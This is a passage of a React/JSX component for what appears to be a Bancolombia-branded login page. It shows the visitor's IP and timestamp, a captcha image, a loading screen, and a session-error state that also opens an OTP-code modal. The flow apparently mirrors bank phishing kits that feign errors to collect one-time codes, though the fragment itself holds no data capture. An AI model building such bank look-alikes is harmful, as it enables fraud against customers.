                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ?
                <LoadingBancolombia /> : null}

            {/* Modal de error de sesión */}
            <IniciarSesionModal
                isOpen={formState.lanzarModalErrorSesion}
                onClose={() => setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }))}
            />
            {/* AQUI SE AGREGO EL MODAL NumOTPModal */}
            {formState.lanzarModalErrorSesion ?
                <NumOTPModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }))} /> : null}
        </>
    );
};